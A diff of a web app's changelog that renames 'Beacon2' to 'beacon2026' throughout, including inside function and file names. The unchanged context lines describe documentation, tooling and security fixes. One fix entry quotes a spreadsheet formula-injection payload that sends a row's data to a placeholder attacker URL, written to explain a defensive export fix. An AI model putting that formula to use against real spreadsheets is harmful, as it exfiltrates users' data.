@@ -1,4 +1,4 @@
-# Beacon2 Changelog
+# beacon2026 Changelog
 
 All notable changes are documented here.
 Format: `## [version] — YYYY-MM-DD` with bullet points per change.
@@ -23,8 +23,8 @@ under the Unreleased headings below).
 
 ### Changed
 - **Documentation review (2026-06-14)** — full consistency/accuracy pass over the
-  core docs and the Beacon2 User Guide, verified against the code:
-  - Corrected the stale version in `Beacon2 Project Definition.md` (0.11.0 → 0.11.1)
+  core docs and the beacon2026 User Guide, verified against the code:
+  - Corrected the stale version in `beacon2026 Project Definition.md` (0.11.0 → 0.11.1)
     and documented the account-lockout mechanism.
   - Refreshed `docs/data-model.md` with the `saved_reports` and
     `session_invalidations` tables and the account-lockout columns.
@@ -40,7 +40,7 @@ under the Unreleased headings below).
   - Moved the new-page privilege process into `CONTRIBUTING.md`, added a
     Project-Definition update step to the `CLAUDE.md` session wrap-up, and added a
     top-of-file orientation note to this changelog.
-  - Logged the outstanding Beacon2 User Guide screenshots in `KNOWN-ISSUES.md`.
+  - Logged the outstanding beacon2026 User Guide screenshots in `KNOWN-ISSUES.md`.
 - **Tooling & dependency hygiene (2026-06-14 review, Chunk 10)** —
   - Migrated `pdfmake` from `0.2.x` to `0.3.x` (now `^0.3.11`). pdfmake 0.3
     removed the server `pdfmake/src/printer` class, so `routes/letters.js` now
@@ -82,7 +82,7 @@ under the Unreleased headings below).
 
 ### Added
 - **Licensing & legal hygiene (2026-06-14 review, Chunk 1)** —
-  - Root `LICENSE` declaring Beacon2 **proprietary / all rights reserved**
+  - Root `LICENSE` declaring beacon2026 **proprietary / all rights reserved**
     (Copyright (c) 2026 Peter Cooper), noting the project is a clean-room
     reproduction not affiliated with the Third Age Trust.
   - `SECURITY.md` vulnerability-disclosure policy directing reports through
@@ -143,7 +143,7 @@ under the Unreleased headings below).
     but enforced nowhere, so correct contact-hiding depends first on that model
     — captured as a clearer deferred note in `KNOWN-ISSUES.md`.
   - Documented the correct pending-transaction bulk-action eligibility in
-    `docs/Beacon2UG/34-pending-transactions.md` (in-year, non-cleared,
+    `docs/beacon2026UG/34-pending-transactions.md` (in-year, non-cleared,
     non-batched), and added an editor's note to the faithful UG 7.10.5
     transcription flagging the contradictory bullet in the original manual.
 - **Service-layer extraction for finance transactions (2026-06-14 review,
@@ -302,7 +302,7 @@ under the Unreleased headings below).
   explaining their provenance). `KNOWN-ISSUES.md` is now stated explicitly as the
   single living backlog and its cross-links point at the archived copies. No open
   items were lost — all deferred work was already tracked in `KNOWN-ISSUES.md`.
-  `Beacon2 Project Definition.md` had its stale "April 2026" header refreshed to
+  `beacon2026 Project Definition.md` had its stale "April 2026" header refreshed to
   June 2026 / v0.11.0 and is now cross-referenced with `README.md` as the
   canonical module/route/page inventory (README being the shorter repo-orientation
   map), removing the ambiguity over which layout tree is authoritative.
@@ -335,7 +335,7 @@ under the Unreleased headings below).
   following the `finance/` precedent. Pure moves, no behaviour change:
   - `routes/backup.js` (2,353 lines) → `routes/backup/` with `export.js`
     (the `/export` route plus all sheet builders), `restore.js` (the
-    `clearTenantData`/`resetSequences`/`restoreBeacon2`/`restoreBeacon`
+    `clearTenantData`/`resetSequences`/`restorebeacon2026`/`restoreBeacon`
     helpers consumed by `system.js`), a shared `helpers.js` (the `str` cell
     coercer used by both), and `index.js` (applies `requireAuth`, mounts the
     export router, re-exports the restore helpers).
@@ -566,7 +566,7 @@ under the Unreleased headings below).
   enumerated with required/optional status, so the README's `cp .env.example
   .env` step now works.
 - **`docs/BeaconUG/README.md`** added — marks the original-Beacon User Guide as
-  legacy reference-only and points to the Beacon2 guide.
+  legacy reference-only and points to the beacon2026 guide.
 - **README quickstart corrected** to match reality: `npm run build`
   (prisma generate) then `npm run dev` (which runs `prisma db push` + seeds the
   first admin automatically); fixed the stale `pages/misc/*` reference.
@@ -574,7 +574,7 @@ under the Unreleased headings below).
   tags with a legend, and cross-link `docs/ImprovementPlan.md` /
   `CODEBASE-RECOMMENDATIONS.md`; the latter now cross-links back.
 - **Placeholder credentials neutralised** — `render.yaml` `SEED_ADMIN_EMAIL`
-  is now `sync: false` (no `admin@beacon2.local` default); `e2e/.env.example`
+  is now `sync: false` (no `admin@beacon2026.local` default); `e2e/.env.example`
   no longer ships `ChangeMe123!` / `TestAdmin99!`.
 - **CLAUDE.md** now opens with a note that the `CLAUDE-*.md` files are
   AI-session tooling and humans should start at `README.md`/`CONTRIBUTING.md`;
@@ -628,7 +628,7 @@ under the Unreleased headings below).
 - **npm audit clean-up** — `npm audit fix` applied in both `backend/`
   and `frontend/`. Backend: 7 vulnerabilities (2 high, 5 moderate) →
   2 moderate; remaining two are `uuid<11.1.1`'s missing buffer-bounds
-  check on the v3/v5/v6 `buf` argument, which doesn't affect Beacon2's
+  check on the v3/v5/v6 `buf` argument, which doesn't affect beacon2026's
   v4-only usage. Frontend: 4 moderate → 0 (postcss XSS-via-CSS,
   react-router protocol-relative open redirect, ws memory disclosure,
   axios prototype-pollution chain). No `package.json` changes were
@@ -658,7 +658,7 @@ under the Unreleased headings below).
   `=HYPERLINK("http://attacker/?c="&A2,"click")` could exfiltrate the
   row when an admin opened the daily backup.
 - **Restore no longer imports `password_hash` from the backup file** —
-  `routes/backup.js:restoreBeacon2`. A malicious backup could otherwise
+  `routes/backup.js:restorebeacon2026`. A malicious backup could otherwise
   plant a known-password account bound to Administration via the User
   roles sheet. Imported users now have NULL `password_hash`; the
   sys-admin must use "Set temporary password for all users" on the
@@ -710,8 +710,8 @@ under the Unreleased headings below).
 ### Added
 - **`analyse-u3a-artifacts/`** — a self-contained primer kit destined for a
   separate, local-only **Analyse u3a** repo (a new desktop analysis app that
-  consumes the same Beacon backup `.xlsx` format Beacon2 imports). Folder is
-  not used by Beacon2 at runtime; it exists here so it can be reviewed and
+  consumes the same Beacon backup `.xlsx` format beacon2026 imports). Folder is
+  not used by beacon2026 at runtime; it exists here so it can be reviewed and
   copied wholesale into the new repo.
   - `BEACON-DATA-STRUCTURE.md` (top-level reference, Mermaid ER diagram) plus
     four per-module references (`MEMBERS`, `GROUPS`, `FINANCE`, `CONTACTS`)
@@ -747,7 +747,7 @@ under the Unreleased headings below).
   `calendar`): these are all universally useful and only added noise to the
   configuration page. Addresses export and statistics are now always visible;
   the calendar is controlled by the `events` master toggle.
-- **Final toggle count: 25** (was 24). `Beacon2 Project Definition.md` already
+- **Final toggle count: 25** (was 24). `beacon2026 Project Definition.md` already
   quoted 25 and is now accurate.
 - **Group Cash / Team Cash tabs clarified** — added a short description under the
   heading explaining that these entries are the group's/team's own cash record,
@@ -884,7 +884,7 @@ under the Unreleased headings below).
   **Custom Fields**. `restoreBeacon()` in `backend/src/routes/backup.js` now
   applies this preset as its final `tenant_settings` write, so a u3a
   migrating from Beacon lands with the recommended feature set (including
-  Gift Aid and Group Ledger, which previously defaulted OFF). Beacon2-format
+  Gift Aid and Group Ledger, which previously defaulted OFF). beacon2026-format
   restores are unchanged — they continue to carry their own `feature_config`
 
 ### Fixed
